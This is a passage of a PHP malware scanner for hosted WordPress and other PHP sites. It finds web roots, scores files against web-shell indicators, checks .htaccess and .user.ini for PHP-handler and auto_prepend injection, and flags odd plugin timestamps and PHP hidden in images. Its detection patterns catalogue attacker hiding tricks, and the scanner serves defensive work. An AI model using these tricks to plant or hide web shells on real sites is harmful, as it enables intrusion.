            $mainHost = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? '';
            $mainHost = strtolower(preg_replace('/:\d+$/', '', $mainHost));
            $roots[$mainHost ?: 'main'] = "$home/public_html";
        }
        // 1&1/IONOS: $home/htdocs/sitename/ pattern
        // OR single-site where htdocs IS the web root (TransIP/CephFS managed hosting)
        if (empty($roots) && is_dir("$home/htdocs")) {
            $htdocsDir = "$home/htdocs";
            $mh = strtolower(preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST'] ?? ''));
            if (file_exists("$htdocsDir/index.php") || file_exists("$htdocsDir/wp-config.php") || file_exists("$htdocsDir/configuration.php")) {
                // htdocs itself is the site root — single Joomla/WP/PHP site
                $roots[$mh ?: 'main'] = $htdocsDir;
            } else {
                foreach (scandir($htdocsDir) as $d) {
                    if ($d === '.' || $d === '..' || !is_dir("$htdocsDir/$d"))
                        continue;
                    if (in_array($d, ['logs', 'htaccess-backup', 'leer', 'vmfiles']))
                        continue;
                    $roots[$d] = "$htdocsDir/$d";
                }
            }
        }
        // Plesk: $home/httpdocs/
        if (empty($roots) && is_dir("$home/httpdocs")) {
            $mainHost = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? '';
            $mainHost = strtolower(preg_replace('/:\d+$/', '', $mainHost));
            $roots[$mainHost ?: 'main'] = "$home/httpdocs";
        }
        // VPS: /var/www/domain.com/ or /var/www/domain.com/public_html/
        if (empty($roots) && is_dir('/var/www')) {
            foreach (scandir('/var/www') as $d) {
                if ($d === '.' || $d === '..' || !is_dir("/var/www/$d"))
                    continue;
                if (in_array($d, ['html', 'logs', 'cache', 'vhosts', 'cgi-bin']))
                    continue;
                if (strpos($d, '.') !== false) {
                    $pub = "/var/www/$d/public_html";
                    $htdocs = "/var/www/$d/htdocs";
                    $web = "/var/www/$d/web";
                    if (is_dir($pub))
                        $roots[$d] = $pub;
                    elseif (is_dir($htdocs))
                        $roots[$d] = $htdocs;
                    elseif (is_dir($web))
                        $roots[$d] = $web;
                    else
                        $roots[$d] = "/var/www/$d";
                }
            }
        }
        // VPS: /var/www/vhosts/domain.com/
        if (empty($roots) && is_dir('/var/www/vhosts')) {
            foreach (scandir('/var/www/vhosts') as $d) {
                if ($d === '.' || $d === '..' || !is_dir("/var/www/vhosts/$d"))
                    continue;
                if (strpos($d, '.') !== false) {
                    $htdocs = "/var/www/vhosts/$d/httpdocs";
                    $pub = "/var/www/vhosts/$d/public_html";
                    if (is_dir($htdocs))
                        $roots[$d] = $htdocs;
                    elseif (is_dir($pub))
                        $roots[$d] = $pub;
                    else
                        $roots[$d] = "/var/www/vhosts/$d";
                }
            }
        }
        // VPS: /var/www/html/ (single site default)
        if (empty($roots) && is_dir('/var/www/html')) {
            $mainHost = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? '';
            $mainHost = strtolower(preg_replace('/:\d+$/', '', $mainHost));
            $roots[$mainHost ?: 'main'] = '/var/www/html';
        }
        // ISPmanager/Beget/TimeWeb (RU hosting): /var/www/user/data/www/domain.com/
        if (is_dir("$home/www")) {
            foreach (scandir("$home/www") as $d) {
                if ($d === '.' || $d === '..')
                    continue;
                $wp = "$home/www/$d";
                if (is_dir($wp) && strpos($d, '.') !== false && !isset($roots[$d]))
                    $roots[$d] = $wp;
            }
        }
        // Fallback: use DOCUMENT_ROOT directly
        if (empty($roots)) {
            $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
            if ($docRoot && is_dir($docRoot)) {
                $mainHost = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? '';
                $mainHost = strtolower(preg_replace('/:\d+$/', '', $mainHost));
                $roots[$mainHost ?: 'main'] = $docRoot;
            }
        }
        // ALWAYS include DOCUMENT_ROOT if not already covered
        $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
        if ($docRoot && is_dir($docRoot)) {
            $alreadyCovered = false;
            foreach ($roots as $r) {
                // Only covered if existing root is a parent of or equal to docRoot.
                // If existing root is a CHILD of docRoot, root-level files are still unscanned.
                if (strpos($docRoot, $r) === 0) {
                    $alreadyCovered = true;
                    break;
                }
            }
            if (!$alreadyCovered) {
                $mainHost = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? '';
                $mainHost = strtolower(preg_replace('/:\d+$/', '', $mainHost));
                $roots[$mainHost ?: 'docroot'] = $docRoot;
            }
        }
        // Custom domain filter — scan satu domain saja
        if (!empty($_POST['scan_domain'])) {
            $sd = trim($_POST['scan_domain']);
            if (isset($roots[$sd]))
                $roots = [$sd => $roots[$sd]];
        }
        // Custom path override — restricted to home dir or document root
        if (!empty($_POST['scan_path'])) {
            $cp = realpath(trim($_POST['scan_path']));
            $allowedBases = array_filter(array_map('realpath', [$home, $_SERVER['DOCUMENT_ROOT'] ?? '']), 'strlen');
            $pathOk = false;
            foreach ($allowedBases as $base) {
                if ($base && strpos($cp . '/', $base . '/') === 0) {
                    $pathOk = true;
                    break;
                }
            }
            if ($cp && is_dir($cp) && $pathOk) {
                // Fix chmod 111/555 evasion — restore read bits so iterator can list files
                if (!is_readable($cp)) @chmod($cp, @fileperms($cp) | 0444);
                $roots = ['custom' => $cp];
            }
        }
        // ── SCAN FILE CLOSURE — pakai scoring + entropy ──────────────────
        // Self-skip is path-based inside the scanner closure.
        // Known WP plugin file counts — plugins with KNOWN structure
        // If a plugin has significantly more PHP files than expected, extra files = injected
        // Format: 'plugin-slug' => max expected PHP files (generous estimate)
        // NOTE: content fingerprints are not trusted; only the running scanner path is skipped.
        $knownPluginFileCounts = [
            'kaya-qr-code-generator' => 15,
            'safe-svg' => 20,
            'duplicate-post' => 30,
            'imsanity' => 15,
            'compressx' => 30,
            'custom-post-type-ui' => 25,
            'oxy-toolbox' => 40,
            'really-simple-ssl' => 80,
            'wp-fastest-cache' => 50,
        ];
        // Collect timestamps per plugin dir for anomaly detection
        $pluginTimestamps = []; // ['plugin-slug' => [mtime1, mtime2, ...]]
        // Load whitelist
        $_wlFile = __DIR__ . '/.shield_whitelist.json';
        $_whitelist = file_exists($_wlFile) ? json_decode(@file_get_contents($_wlFile), true) : [];
        if (!is_array($_whitelist)) $_whitelist = [];
        $scanFile = function ($c, $fp, $sz, $dom) use ($scoredSigs, $RISK_THRESHOLD, $calcEntropy, $findLargeB64Blob, $_whitelist) {
            // Skip only this running scanner file; content fingerprints are too easy to abuse.
            $realFp = shield_norm_path(realpath($fp) ?: $fp);
            $selfFile = shield_norm_path(realpath(__FILE__) ?: __FILE__);
            if ($realFp === $selfFile)
                return null;
            if (shield_is_benign_php_placeholder($fp, $c, $sz))
                return null;
            $totalScore = 0;
            $hitSigs = [];
            $topSig = '';
            foreach ($scoredSigs as $s) {
                if (@preg_match($s['pat'], $c)) {
                    $totalScore += $s['score'];
                    $hitSigs[] = $s['sig'];
                    if (!$topSig)
                        $topSig = $s['sig'];
                    if ($totalScore >= 300)
                        break;
                }
            }
            shield_apply_normalized_scan($c, $fp, $totalScore, $hitSigs, $topSig);
            shield_apply_decoded_payload_scan($c, $scoredSigs, $totalScore, $hitSigs, $topSig);
            // mu-plugins: auto-loaded on EVERY request — attacker favorite, always suspicious
            if (preg_match('#/mu-plugins/[^/]+\.php$#', $fp) && !preg_match('#/mu-plugins/index\.php$#', $fp)) {
                $totalScore += 60;
                $hitSigs[] = 'mu_plugin_file';
                if (!$topSig)
                    $topSig = 'mu_plugin_file';
            }
            // PHP-in-non-PHP-dir: PHP file inside js/, css/, assets/, images/, fonts/ = highly suspicious
            if (preg_match('#/(?:js|css|assets|images|fonts|media|static)(?:/|$).*\.php$#', $fp) && $sz > 100) {
                $totalScore += 70;
                $hitSigs[] = 'php_in_nonphp_dir';
                if (!$topSig)
                    $topSig = 'php_in_nonphp_dir';
            }
            // PHP in languages/i18n dir (NOT .l10n.php/.mo/.po which are legit WP 6.5+ translation caches)
            if (preg_match('#/(?:languages|i18n|lang)(?:/|$).*\.php$#', $fp) && !preg_match('/\.l10n\.php$/', $fp) && $sz > 500) {
                $totalScore += 50;
                $hitSigs[] = 'php_in_lang_dir';
                if (!$topSig)
                    $topSig = 'php_in_lang_dir';
            }
            // PHP in uploads dir — PHP tidak boleh ada di sini sama sekali
            if (preg_match('#/(?:uploads?|userfiles|user-files)(?:/|$).*\.(?:php[0-9]?|phtml|phar)$#i', $fp)) {
                $totalScore += 100;
                $hitSigs[] = 'php_in_uploads';
                if (!$topSig)
                    $topSig = 'php_in_uploads';
            }
            // PHP in tmp/temp/cache dirs — seharusnya tidak ada PHP executable di sini
            if (preg_match('#/(?:tmp|temp|cache|sessions?|logs?|backup|bak)(?:/|$).*\.(?:php[0-9]?|phtml|phar|phps)$#i', $fp)) {
                $totalScore += 100;
                $hitSigs[] = 'php_in_temp_dir';
                if (!$topSig)
                    $topSig = 'php_in_temp_dir';
            }
            // Double/triple extension — file.xml.phtml, file.jpg.php, file.png.php5
            if (preg_match('/\.\w{2,4}\.(php[0-9]?|phtml|phar)$/i', $fp)) {
                $totalScore += 100;
                $hitSigs[] = 'multi_ext_php';
                if (!$topSig)
                    $topSig = 'multi_ext_php';
            }
            // Alternative PHP extension (phtml/php5/php7/phar) di luar uploads = suspicious
            if (preg_match('/\.(phtml|php5|php7|phar)$/i', $fp)) {
                $totalScore += 70;
                $hitSigs[] = 'alt_php_ext';
                if (!$topSig)
                    $topSig = 'alt_php_ext';
            }
            // Timestamp-pattern filename: t_UNIX_COUNTER.ext — mass-deploy shell pattern
            if (preg_match('/\/t_\d{9,13}_\d{1,4}\.(?:php[0-9]?|phtml|phar)$/i', $fp)) {
                $totalScore += 200;
                $hitSigs[] = 'timestamp_filename';
                if (!$topSig)
                    $topSig = 'timestamp_filename';
            }
            // wp_ prefix + all-consonant suffix — mimics WP naming tapi suffix gibberish tanpa vowel
            // cth: wp_wpzgt.php, wp_xzplk.php, wp_bkdrf.php — berlaku di semua folder
            // false positive risk ~0%: tidak ada file plugin/WP legit dengan nama seperti ini
            if (preg_match('#(?:^|[/\\\\])wp_([bcdfghjklmnpqrstvwxyz0-9]{5,})\.php$#i', $fp)) {
                $totalScore += 100;
                $hitSigs[] = 'wp_prefix_gibberish_name';
                if (!$topSig)
                    $topSig = 'wp_prefix_gibberish_name';
            }
            // Entropy check: hanya hitung kalau memang ada blob panjang.
            if ($totalScore < $RISK_THRESHOLD && $sz < 200 * 1024) {
                $blob = $findLargeB64Blob($c);
                $entropy = $blob !== '' ? $calcEntropy(substr($blob, 0, 8000)) : 0;
                if ($entropy > 5.4) {
                    $totalScore += 60;
                    $hitSigs[] = 'high_entropy_blob';
                    if (!$topSig)
                        $topSig = 'high_entropy_blob';
                }
            }
            shield_apply_false_positive_suppression($c, $fp, $sz, $totalScore, $hitSigs, $topSig);
            // Whitelist: remove whitelisted sigs/paths/dirs from results
            // Size-pinned entries: if file size changed → whitelist void (file was tampered)
            $normFp = shield_norm_path($fp);
            $wlFiltered = [];
            foreach ($_whitelist as $wl) {
                if (isset($wl['size']) && $wl['size'] > 0 && $wl['size'] !== $sz) continue;
                $wlType = $wl['type'] ?? '';
                if ($wlType === 'path' && isset($wl['path']) && shield_norm_path($wl['path']) === $normFp) {
                    if (!empty($wl['sig'])) {
                        $wlFiltered[] = $wl['sig'];
                    } else {
                        $totalScore = 0; $hitSigs = []; $topSig = ''; break;
                    }
                } elseif ($wlType === 'dir' && isset($wl['dir']) && strpos($normFp, rtrim($wl['dir'], '/') . '/') === 0) {
                    if (!empty($wl['sig'])) {
                        $wlFiltered[] = $wl['sig'];
                    } else {
                        $totalScore = 0; $hitSigs = []; $topSig = ''; break;
                    }
                } elseif ($wlType === 'sig' && isset($wl['sig'])) {
                    $wlFiltered[] = $wl['sig'];
                }
            }
            foreach ($wlFiltered as $wlSig) {
                $idx = array_search($wlSig, $hitSigs, true);
                if ($idx !== false) {
                    unset($hitSigs[$idx]);
                    $hitSigs = array_values($hitSigs);
                    foreach ($scoredSigs as $s) {
                        if ($s['sig'] === $wlSig) { $totalScore = max(0, $totalScore - $s['score']); break; }
                    }
                    if ($topSig === $wlSig) $topSig = $hitSigs[0] ?? '';
                }
            }
            if ($totalScore < $RISK_THRESHOLD)
                return null;
            $sigLabel = count($hitSigs) > 1
                ? $topSig . ' (+' . (count($hitSigs) - 1) . ')'
                : $topSig;
            return [
                'domain' => $dom,
                'sig' => $sigLabel,
                'sigs' => $hitSigs,
                'score' => $totalScore,
                'path' => $fp,
                'size' => $sz,
                'mod' => date('Y-m-d H:i', filemtime($fp)),
            ];
        };
        // ── FULL RECURSIVE SCAN — semua direktori tanpa batas kedalaman ──
        // Skip dir yang pasti aman/tidak relevan agar scan tidak lambat
        // PENTING: JANGAN masukkan 'css','js','images' dll — attacker sering taruh shell di sana!
        // Hanya skip direktori yang 100% tidak akan ada PHP shell
        $skipDirNames = [
            'node_modules',
            '.git',
            'bower_components',
            'ai1wm-backups',
            'upgrade-temp-backup',
            '.sass-cache',
        ];
        // Path patterns yang diketahui legitimate — skip berdasarkan path substring
        // Hanya untuk plugin/library besar yang sering false positive
        $knownLegitPaths = [
            '/wordfence/lib/',             // Wordfence rules (gzip compressed, legitimate)
            '/wp-file-manager/lib/php/',   // elFinder file manager library
            '/wp-includes/html-api/',      // WP 6.5+ HTML Parser (uses goto legitimately)
            '/wp-includes/blocks/',        // WP block editor core
            '/wp-includes/sodium_compat/', // Sodium polyfill
            '/wp-includes/ID3/',           // ID3 tag reader
            '/wp-includes/IXR/',           // XML-RPC library
            '/wp-includes/Requests/',      // HTTP Requests library
            '/wp-includes/SimplePie/',     // RSS parser
            '/phpmailer/src/',             // PHPMailer library
            '/easy-wp-smtp/vendor/',       // SMTP vendor libs
            '/wp-mail-smtp/vendor/',       // WP Mail SMTP vendor
            '/woocommerce/packages/',      // WooCommerce packaged libs
            '/gravityforms/includes/',     // Gravity Forms libs
        ];
        // wp-includes core files — skip berdasarkan filename
        $shouldSkipScanDir = function ($path, $name) use ($skipDirNames) {
            $path = str_replace('\\', '/', $path);
            if (in_array($name, $skipDirNames, true))
                return true;
            return false;
        };
        $skipCoreIncludes = [
            'formatting.php',
            'functions.php',
            'class-wp-hook.php',
            'post.php',
            'query.php',
            'taxonomy.php',
            'user.php',
            'meta.php',
            'kses.php',
            'l10n.php',
            'pluggable.php',
            'template.php',
            'deprecated.php',
            'comment.php',
            'bookmark.php',
            'canonical.php',
            'capabilities.php',
            'class-walker-nav-menu.php',
            'class-wp-query.php',
            'class-wp-rewrite.php',
            'class-wp-user.php',
            'date.php',
            'default-filters.php',
            'embed.php',
            'feed.php',
            'general-template.php',
            'http.php',
            'link-template.php',
            'media.php',
            'nav-menus.php',
            'option.php',
            'plugin.php',
            'post-formats.php',
            'post-template.php',
            'rest-api.php',
            'revision.php',
            'rewrite.php',
            'script-loader.php',
            'shortcodes.php',
            'theme.php',
            'update.php',
            'vars.php',
            'widgets.php',
            'compat-utf8.php',
            'class-wp-http-encoding.php',
            'class-wp-list-table.php',
            'class-wp-roles.php',
            'class-wp-session-tokens.php',
            'class-wp-walker.php',
            'class-wp-widget.php',
            'class-wp-widget-factory.php',
            'class-wp-site-health.php',
            'class-wp-fatal-error-handler.php',
            'sodium_compat.php',
            // WP 6.5+ HTML Parser API — pakai goto secara legitimate
            'class-wp-html-processor.php',
            'class-wp-block-processor.php',
            'class-wp-html-tag-processor.php',
            'class-wp-html-open-elements.php',
            'class-wp-html-active-formatting-elements.php',
        ];
        // PHP files that legitimately live in the WordPress document root
        $knownWpRootFiles = [
            'index.php', 'wp-config.php', 'wp-config-sample.php', 'wp-login.php',
            'wp-cron.php', 'wp-signup.php', 'wp-mail.php', 'wp-comments-post.php',
            'wp-links-opml.php', 'wp-trackback.php', 'wp-activate.php', 'wp-blog-header.php',
            'wp-load.php', 'wp-settings.php', 'xmlrpc.php',
        ];
        $MAX_FILES = shield_scan_max_files(); // safety cap per domain, tunable via scan_max_files
        $scanStarted = microtime(true);
        $isCloudflareRequest = !empty($_SERVER['HTTP_CF_RAY']) || !empty($_SERVER['HTTP_CF_CONNECTING_IP']);
        $MAX_SCAN_SECONDS = $isCloudflareRequest ? 110 : 0; // avoid proxy read timeout on long scans
        if (isset($_POST['scan_max_seconds'])) {
            $requestedLimit = max(0, min(550, intval($_POST['scan_max_seconds'])));
            $MAX_SCAN_SECONDS = $requestedLimit;
        }
        if ($isCloudflareRequest && ($MAX_SCAN_SECONDS === 0 || $MAX_SCAN_SECONDS > 110))
            $MAX_SCAN_SECONDS = 110;
        $scanDeadline = $MAX_SCAN_SECONDS > 0 ? ($scanStarted + $MAX_SCAN_SECONDS) : 0;
        $scanPartial = false;
        // ─────────────────────────────────────────────────────────────────
        foreach ($roots as $dom => $root) {
            if ($scanPartial)
                break;
            if (!is_dir($root))
                continue;
            // Pre-pass: fix chmod 111/555 evasion on custom paths (recursively restore read bits)
            if ($dom === 'custom') {
                $fixReadPerms = function($d, $dep = 0) use (&$fixReadPerms) {
                    if ($dep > 8 || !is_dir($d)) return;
                    if (!is_readable($d)) @chmod($d, @fileperms($d) | 0444);
                    if (!is_readable($d)) return;
                    foreach (@scandir($d) ?: [] as $e) {
                        if ($e === '.' || $e === '..') continue;
                        $p = "$d/$e";
                        if (is_dir($p) && !is_readable($p)) $fixReadPerms($p, $dep + 1);
                    }
                };
                $fixReadPerms($root);
            }
            $fileCount = 0;
            try {
                $dirIterator = new RecursiveDirectoryIterator($root, RecursiveDirectoryIterator::SKIP_DOTS);
                if (class_exists('RecursiveCallbackFilterIterator')) {
                    $dirIterator = new RecursiveCallbackFilterIterator($dirIterator, function ($current) use ($shouldSkipScanDir) {
                        if ($current->isDir() && $shouldSkipScanDir($current->getPathname(), $current->getFilename()))
                            return false;
                        return true;
                    });
                }
                $rit = new RecursiveIteratorIterator($dirIterator, RecursiveIteratorIterator::LEAVES_ONLY, RecursiveIteratorIterator::CATCH_GET_CHILD);
                $rit->setMaxDepth(35);
                foreach ($rit as $fileInfo) {
                    if ($scanDeadline && microtime(true) >= $scanDeadline) {
                        $scanPartial = true;
                        break;
                    }
                    if ($fileCount >= $MAX_FILES)
                        break;
                    if (!$fileInfo->isFile())
                        continue;
                    $ext = strtolower($fileInfo->getExtension());
                    $fname = $fileInfo->getFilename();
                    // Scan PHP variants + .htaccess + .user.ini
                    $isPhpAlt = in_array($ext, ['phtml', 'php5', 'php7', 'phar', 'phps']);
                    $isHtaccess = ($fname === '.htaccess');
                    $isUserIni = ($fname === '.user.ini');
                    if ($ext !== 'php' && !$isPhpAlt && !$isHtaccess && !$isUserIni)
                        continue;
                    $sz = $fileInfo->getSize();
                    if ($sz > 3 * 1024 * 1024)
                        continue;
                    $fp = str_replace('\\', '/', $fileInfo->getPathname());
                    // .htaccess — scan for malicious AddType, SEO bot cloaking, auto_prepend
                    if ($isHtaccess) {
                        $hc = @file_get_contents($fp);
                        if ($hc) {
                            $htChecks = [
                                ['sig' => 'htaccess_php_type', 'pat' => '/AddType\s+(?:application\/x-httpd-php|x-httpd-php)[^\n]*\.(jpg|jpeg|png|gif|css|js|txt|svg|ico)/i'],
                                ['sig' => 'htaccess_cloak_marker', 'pat' => '/(?:CLOAK\s+START|CLOAK\s+END)/i'],
                                ['sig' => 'htaccess_bot_ua_env', 'pat' => '/SetEnvIfNoCase\s+User-Agent[^\n]+(?:Google|Googlebot|bingbot|YandexBot|crawl|spider|bot)/i'],
                                ['sig' => 'htaccess_bot_rewrite', 'pat' => '/RewriteCond\s+%\{ENV:is_(?:google_bot|bot|spider|crawler)\}/i'],
                                ['sig' => 'htaccess_prepend', 'pat' => '/php_value\s+auto_(?:prepend|append)_file/i'],
                                ['sig' => 'htaccess_sethandler', 'pat' => '/SetHandler\s+application\/x-httpd-php/i'],
                                ['sig' => 'htaccess_append', 'pat' => '/php_value\s+auto_append_file/i'],
                                ['sig' => 'htaccess_cgi_handler', 'pat' => '/Action\s+application\/x-httpd-php/i'],
                                ['sig' => 'htaccess_rewrite_php', 'pat' => '/RewriteRule\s+.*\.(jpg|png|gif|ico|txt)\s+.*\.php/i'],
                            ];
                            $htHits = [];
                            foreach ($htChecks as $hk) {
                                if (@preg_match($hk['pat'], $hc))
                                    $htHits[] = $hk['sig'];
                            }
                            if (!empty($htHits)) {
                                $found[] = ['domain' => $dom, 'sig' => $htHits[0] . (count($htHits) > 1 ? ' (+' . (count($htHits) - 1) . ')' : ''), 'sigs' => $htHits, 'score' => 200, 'path' => $fp, 'size' => $sz, 'mod' => date('Y-m-d H:i', filemtime($fp))];
                            }
                        }
                        $fileCount++;
                        continue;
                    }
                    // .user.ini — scan for auto_prepend_file injection (PHP-FPM)
                    if ($isUserIni) {
                        $uc = @file_get_contents($fp);
                        if ($uc && (preg_match('/^\s*auto_prepend_file\s*=/mi', $uc) || preg_match('/^\s*auto_append_file\s*=/mi', $uc))) {
                            $found[] = ['domain' => $dom, 'sig' => 'userini_prepend', 'sigs' => ['userini_prepend'], 'score' => 200, 'path' => $fp, 'size' => $sz, 'mod' => date('Y-m-d H:i', filemtime($fp))];
                        }
                        $fileCount++;
                        continue;
                    }
                    // Skip jika path mengandung direktori yang di-skip
                    $skip = false;
                    foreach ($skipDirNames as $sd) {
                        if (strpos($fp, '/' . $sd . '/') !== false) {
                            $skip = true;
                            break;
                        }
                    }
                    if ($skip)
                        continue;
                    // Known library paths are scanned; generic-only hits are suppressed after content analysis.
                    // wp-includes: skip known WP core files by filename
                    if (strpos($fp, '/wp-includes/') !== false) {
                        if (in_array($fileInfo->getFilename(), $skipCoreIncludes))
                            continue;
                    }
                    // Zero-byte PHP di lokasi sensitif = SUSPICIOUS (marker file)
                    if ($sz === 0) {
                        $sensitivePaths = ['/wp-admin/', '/wp-includes/', '/wp-content/upgrade/', '/wp-content/plugins/', '/wp-content/themes/'];
                        foreach ($sensitivePaths as $sp) {
                            if (strpos($fp, $sp) !== false) {
                                $found[] = [
                                    'domain' => $dom,
                                    'sig' => 'zero_byte_marker',
                                    'sigs' => ['zero_byte_marker'],
                                    'score' => 80,
                                    'path' => $fp,
                                    'size' => 0,
                                    'mod' => date('Y-m-d H:i', filemtime($fp)),
                                ];
                                break;
                            }
                        }
                        $fileCount++;
                        continue;
                    }
                    // Collect timestamp per plugin dir for anomaly detection
                    if (preg_match('#/wp-content/plugins/([^/]+)/#', $fp, $plMatch)) {
                        $plSlug = $plMatch[1];
                        if (!isset($pluginTimestamps[$plSlug]))
                            $pluginTimestamps[$plSlug] = [];
                        $pluginTimestamps[$plSlug][] = ['path' => $fp, 'mtime' => filemtime($fp), 'size' => $sz, 'domain' => $dom];
                    }
                    $c = @file_get_contents($fp);
                    if ($c === false)
                        continue;
                    $fileCount++;
                    // PHAR binary detection — check header before regex (regex fails on binary/null bytes)
                    if ($sz > 500 && (strpos($c, '__HALT_COMPILER') !== false || substr($c, 0, 4) === "\x00\x00\x00\x00" || strpos($c, "\xd1\x07GBMB") !== false || (substr($c, 0, 5) === '<?php' && strpos(substr($c, 0, min($sz, 2000)), "\x00") !== false))) {
                        $found[] = ['domain' => $dom, 'sig' => 'phar_manifest', 'sigs' => ['phar_manifest'], 'score' => 100, 'path' => $fp, 'size' => $sz, 'mod' => date('Y-m-d H:i', filemtime($fp))];
                        continue;
                    }
                    $result = $scanFile($c, $fp, $sz, $dom);
                    // WP root foreign-file check — PHP directly in docroot that isn't a core WP file
                    $normRoot = rtrim(str_replace('\\', '/', $root), '/');
                    $normFp   = str_replace('\\', '/', $fp);
                    if (preg_match('/\.php[0-9]?$/i', $fp)
                        && dirname($normFp) === $normRoot
                        && file_exists("$normRoot/wp-config.php")) {
                        $fname = strtolower(basename($fp));
                        if (!in_array($fname, $knownWpRootFiles)) {
                            if ($result) {
                                if (!in_array('unknown_wp_root_php', $result['sigs'])) {
                                    $result['sigs'][] = 'unknown_wp_root_php';
                                    $result['score'] += 50;
                                    $result['sig'] = $result['sigs'][0] . ' (+' . (count($result['sigs']) - 1) . ')';
                                }
                            } else {
                                $result = [
                                    'domain' => $dom,
                                    'sig'    => 'unknown_wp_root_php',
                                    'sigs'   => ['unknown_wp_root_php'],
                                    'score'  => 100,
                                    'path'   => $fp,
                                    'size'   => $sz,
                                    'mod'    => date('Y-m-d H:i', filemtime($fp)),
                                    'note'   => 'PHP file di WP root — bukan file WP core yang dikenal',
                                ];
                            }
                        }
                    }
                    if ($result)
                        $found[] = $result;
                }
            } catch (Exception $e) { /* dir not accessible */
            }
            $r['files_scanned'][$dom] = $fileCount;
        }

        // ── POST-SCAN: Timestamp Anomaly Detection ──────────────────────
        // Per plugin: calculate median mtime. Files with mtime >7 days different = injected later
        if (!$scanPartial) {
            foreach ($pluginTimestamps as $plSlug => $files) {
                if (count($files) < 3)
                    continue; // need at least 3 files to detect anomaly
                $mtimes = array_column($files, 'mtime');
                sort($mtimes);
                $median = $mtimes[(int) (count($mtimes) / 2)];
                $threshold = 7 * 86400; // 7 days
                foreach ($files as $f) {
                    $diff = abs($f['mtime'] - $median);
                    if ($diff > $threshold) {
                        // Check if already flagged by signature scan
                        $alreadyFlagged = false;
                        foreach ($found as $existing) {
                            if ($existing['path'] === $f['path']) {
                                $alreadyFlagged = true;
                                break;
                            }
                        }
                        if ($alreadyFlagged)
                            continue;
                        // Skip index.php (often touched by WP updates)
                        if (basename($f['path']) === 'index.php' && $f['size'] < 100)
                            continue;
                        $daysDiff = round($diff / 86400);
                        $found[] = [
                            'domain' => $f['domain'] ?? (array_key_first($roots) ?: 'unknown'),
                            'sig' => "timestamp_anomaly (+{$daysDiff}d)",
                            'sigs' => ['timestamp_anomaly'],
                            'score' => 70,
                            'path' => $f['path'],
                            'size' => $f['size'],
                            'mod' => date('Y-m-d H:i', $f['mtime']),
                            'note' => "Plugin '$plSlug' median: " . date('Y-m-d', $median) . ", this file: " . date('Y-m-d', $f['mtime']),
                        ];
                    }
                }
            }

            // ── POST-SCAN: Foreign File Detection (excess PHP in known plugins) ──
            foreach ($pluginTimestamps as $plSlug => $files) {
                if (!isset($knownPluginFileCounts[$plSlug]))
                    continue;
                $expected = $knownPluginFileCounts[$plSlug];
                $actual = count($files);
                if ($actual > $expected) {
                    $excess = $actual - $expected;
                    // Find the files that are most likely injected (newest mtime)
                    usort($files, function ($a, $b) {
                        return $b['mtime'] - $a['mtime'];
                    });
                    $suspects = array_slice($files, 0, $excess);
                    foreach ($suspects as $f) {
                        $alreadyFlagged = false;
                        foreach ($found as $existing) {
                            if ($existing['path'] === $f['path']) {
                                $alreadyFlagged = true;
                                break;
                            }
                        }
                        if ($alreadyFlagged)
                            continue;
                        if (basename($f['path']) === 'index.php' && $f['size'] < 100)
                            continue;
                        $found[] = [
                            'domain' => $f['domain'] ?? (array_key_first($roots) ?: 'unknown'),
                            'sig' => "foreign_file ($plSlug: $actual/$expected)",
                            'sigs' => ['foreign_file_in_plugin'],
                            'score' => 60,
                            'path' => $f['path'],
                            'size' => $f['size'],
                            'mod' => date('Y-m-d H:i', $f['mtime']),
                            'note' => "Plugin '$plSlug' has $actual PHP files (expected max $expected)",
                        ];
                    }
                }
            }

        }

        // ── SCAN FILE NON-PHP DI UPLOADS — cari PHP tersembunyi di gambar ──
        $suspectExts = ['jpg', 'jpeg', 'png', 'gif', 'ico', 'bmp', 'webp', 'avif', 'heic', 'svg', 'dat', 'log', 'txt', 'css', 'js', 'html', 'htm', 'shtml', 'xml', 'json', 'zip', 'tar', 'gz', 'bak', 'old', 'tmp', 'conf', 'ini'];
        $phpSigs = '/(<\?php|<\?=|<script\s+language\s*=\s*[\'"]?php|\beval\s*\(|base64_decode\s*\(|assert\s*\()/i';
        foreach ($roots as $dom => $root) {
            if (!is_dir($root))
                continue;
            // scan wp-content/uploads dan direktori sensitif lainnya
            $scanNonPhpDirs = [];
            foreach (['wp-content/uploads', 'wp-content/cache', 'wp-content/wflogs'] as $rel) {
                $p = "$root/$rel";
                if (is_dir($p))
                    $scanNonPhpDirs[] = $p;
            }
            foreach ($scanNonPhpDirs as $upDir) {
                try {
                    $upIt = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($upDir, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::LEAVES_ONLY
                    );
                    $upCount = 0;
                    foreach ($upIt as $fi) {
                        if ($upCount >= 8000)
                            break;
                        if (!$fi->isFile())
                            continue;
                        $ext = strtolower($fi->getExtension());
                        if (!in_array($ext, $suspectExts))
                            continue;
                        $sz = $fi->getSize();
                        if ($sz < 10 || $sz > 8 * 1024 * 1024)
                            continue;
                        $snippet = shield_read_file_edges($fi->getPathname());
                        if ($snippet === '') {
                            $upCount++;
                            continue;
                        }
                        if (@preg_match($phpSigs, $snippet)) {
                            $found[] = [
                                'domain' => $dom,
                                'sig' => 'php_in_' . $ext . '_file',
                                'sigs' => ['php_hidden_in_nonphp'],
                                'score' => 100,
                                'path' => str_replace('\\', '/', $fi->getPathname()),
                                'size' => $sz,
                                'mod' => date('Y-m-d H:i', filemtime($fi->getPathname())),
                            ];
                        }
                        $upCount++;
                    }
                } catch (Exception $e) {
                }
            }
        }

        $r['threats'] = $found;
        $r['total'] = count($found);
        $r['domains'] = count($roots);
        $r['scan_seconds'] = round(microtime(true) - $scanStarted, 2);
        if ($scanPartial) {
            $r['partial'] = true;
            $r['message'] = 'Scan stopped before proxy timeout. Select one domain or a narrower custom path for complete results.';
        }
    } elseif ($api === 'scan_files_stream') {
        // ── STREAMING SCAN — sama persis dengan scan_files tapi output NDJSON ──
        // Setiap threat langsung di-flush ke client tanpa menunggu semua selesai
        // Format: satu JSON object per baris (NDJSON)
        // Types: {type:"start"}, {type:"progress"}, {type:"threat"}, {type:"done"}
